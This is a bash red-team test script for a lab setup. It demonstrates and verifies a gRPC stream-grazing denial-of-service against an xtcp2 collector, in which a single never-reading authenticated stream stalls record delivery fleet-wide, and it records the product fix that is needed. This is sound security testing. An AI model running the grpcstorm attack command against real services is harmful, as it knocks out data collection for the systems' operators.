#!/usr/bin/env bash
# vagrant/scenarios/rt-11-3-stream-graze.sh — RT-11: gRPC stream-slot
# grazing (docs/redteam-plan.md row rt-11-3).
#
# The chain: a tier-2 attacker holding a READ token opens authenticated
# FlatRecords streams and simply does not read them. The plan's premise:
# the per-conn cap is 20 streams and there is no global stream quota, so
# grazing streams "add goroutines and buffer pressure" — bounded
# degradation. The premortem audit found a stronger shape: flatRecordServiceSend
# (pkg/xtcp/grpc_flatRecordService.go:231) runs ON THE RECORD HOT PATH
# (called per record from Deserialize, pkg/xtcp/deserialize.go:274) and
# does a BLOCKING per-client stream.Send under a per-stream mutex — serially
# over every connected client. A stream that never reads exhausts its
# HTTP/2 flow-control window (~64 KiB, a few hundred records), after which
# the server-side Send blocks INDEFINITELY (no Send timeout exists; the
# only unblock is the client closing). Every decoder goroutine fans out to
# every client, so ONE never-reading stream wedges the whole decode fleet:
# envelopes never complete, the destination goes dark — the collection
# side of the RT-11 crossover, from a single read credential.
#
# THE MEASURED SHAPE (probe, 2026-11-25): one rate-0 stream dropped the
# catcher from 1488 to 109 lines/6s (−93%; the residue is the first
# window's worth of records before the wedge engaged), with immediate
# recovery on close (2030 lines/6s — the catch-up flush) and NO goroutine
# leak (69 → 75 → 69: one handler + the conn's transport goroutines).
#
# Asserts:
#   - the wedge engages: the catcher drops to a trickle while held;
#   - the API stays up while the records are dark (the tier-2 split:
#     metrics 200, collection stalled — the inverse of rt-11-2's FD pin);
#   - goroutines stay bounded (+handler+transport, not per-record growth);
#   - the daemon survives the whole hold;
#   - release: the catcher resumes within a few poll cycles and goroutines
#     return to baseline (no leak — the handler's deferred map Delete).
set -euo pipefail

: "${XTCP2_MODE:=bridge}"
: "${XTCP2_AUTH:=raw}"
: "${XTCP2_ATTACKER:=plain}"
: "${XTCP2_PPROF:=1}" # the goroutine-count asserts need the debug listener
XTCP2_EXPECT="${XTCP2_EXPECT:-CONFIRMED}"

# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/matrix.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/evidence.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/ssh.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/deploy.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/invariant.sh"
# shellcheck source=/dev/null
source "$(dirname "${BASH_SOURCE[0]}")/../lib/assert.sh"

xtcp2_matrix_defaults
xtcp2_preflight
evidence_init

echo "rt-11-3: evidence in $RT_EVIDENCE"

xtcp2_deploy victim attacker
wait_for 120 "daemon answers on the victim VM" vm_exec victim \
  "curl -s -o /dev/null -w '%{http_code}' http://127.0.0.1:9088/metrics | grep -qE '^(200|401|403)\$'"
victim_still_reporting_tap
xtcp2_victim_read_token

# --- helpers -------------------------------------------------------------------

GS=/opt/xtcp2-redteam/bin/grpcstorm
GRPC=192.168.142.10:8889 # the attacker VM's vantage (the read-cred tier)
HOLD=90s                 # long past the ~64KiB window fill (~1 poll cycle)

pprof_goroutines() {
  vm_exec victim "curl -s -m 6 -H 'Authorization: Bearer $RT_READ_TOKEN' 'http://127.0.0.1:9090/debug/pprof/goroutine?debug=1' | head -1" \
    | grep -oE '[0-9]+$' || echo 0
}

rate6() {
  local a b
  a="$(catcher_lines)"
  sleep 6
  b="$(catcher_lines)"
  echo $((b - a))
}

daemon_alive() {
  vm_exec victim "sudo docker inspect rt-xtcp2 --format '{{.State.Running}}' | grep -q true"
}

# --- baseline --------------------------------------------------------------------

BASE_RATE="$(rate6)"
BASE_G="$(pprof_goroutines)"
ok "baseline: catcher=${BASE_RATE} lines/6s goroutines=$BASE_G"

# --- the attack: one never-reading stream ----------------------------------------

vm_exec attacker "nohup $GS -target $GRPC -token '$RT_READ_TOKEN' -conns 1 -streams 1 -read-rate 0 -duration $HOLD > /tmp/gs.log 2>&1 &" >/dev/null
wait_for 60 "the grazing stream is up" vm_exec attacker "grep -q GRPCSTORM_READY /tmp/gs.log"
sleep 8 # the stream registers and its ~64KiB window fills (~1 poll cycle)

WEDGED_RATE="$(rate6)"
WEDGED_G="$(pprof_goroutines)"
echo "rt-11-3: while held: catcher=$WEDGED_RATE lines/6s goroutines=$WEDGED_G"

# the crossover: the catcher drops to a trickle (the residue is the first
# window's records, measured ~7% in the probe; keep the assert loose at 15%)
if [ "$WEDGED_RATE" -le $((BASE_RATE * 15 / 100)) ]; then
  ok "CROSSOVER: the catcher is dark while the stream is held ($BASE_RATE -> $WEDGED_RATE lines/6s) — one never-reading stream wedges the decode fleet (flatRecordServiceSend blocks in Send on the record hot path)"
else
  not_ok "the catcher kept flowing ($BASE_RATE -> $WEDGED_RATE lines/6s) — the premise lost; see evidence"
fi

if [ "$WEDGED_G" -le $((BASE_G + 12)) ]; then
  ok "goroutines bounded while held ($BASE_G -> $WEDGED_G: one handler + the conn's transport goroutines, not per-record growth)"
else
  not_ok "goroutine count exploded while held ($BASE_G -> $WEDGED_G) — see evidence"
fi

code="$(vm_exec victim "curl -s -m 6 -o /dev/null -w '%{http_code}' -H 'Authorization: Bearer $RT_READ_TOKEN' http://127.0.0.1:9088/metrics" || true)"
if [ "${code:-000}" = 200 ]; then
  ok "the API stays up while the records are dark (scrape 200 — the tier-2 split: FD/starvation attacks blind the API, stream grazing blinds the collection)"
else
  not_ok "the API also went dark (scrape ${code:-000}) — see evidence"
fi

if daemon_alive; then
  ok "the daemon survives the whole hold"
else
  not_ok "the daemon died while held — see evidence"
fi

# --- release: recovery + no leak ---------------------------------------------------

deadline=$((SECONDS + 120))
until vm_exec attacker "grep -q GRPCSTORM_DONE /tmp/gs.log" >/dev/null 2>&1; do
  [ "$SECONDS" -ge "$deadline" ] && break
  sleep 3
done
vm_exec attacker "grep GRPCSTORM /tmp/gs.log" || true

if victim_still_reporting; then
  ok "release: the catcher resumed within ${CATCHER_WAIT_SECS}s of the close (the catch-up flush)"
else
  not_ok "release: the catcher did not resume — see evidence"
fi

AFTER_G="$(pprof_goroutines)"
if [ "$AFTER_G" -le $((BASE_G + 4)) ]; then
  ok "no goroutine leak after release ($BASE_G -> $WEDGED_G -> $AFTER_G — the handler's deferred map Delete)"
else
  not_ok "goroutines leaked after release ($BASE_G -> $AFTER_G) — see evidence"
fi

victim_still_reporting_tap

# --- verdict ------------------------------------------------------------------------

# The plan expected bounded degradation ("grazing adds goroutines and buffer
# pressure"); the measured reality is stronger: ONE authenticated
# never-reading stream stops record delivery fleet-wide for as long as it is
# held. A read credential is enough. Product finding pinned in
# docs/redteam-plan.md (flatRecordServiceSend needs a Send timeout or a
# decoupled fan-out so one stalled stream cannot backpressure the pipeline).
finish rt-11-3 CONFIRMED
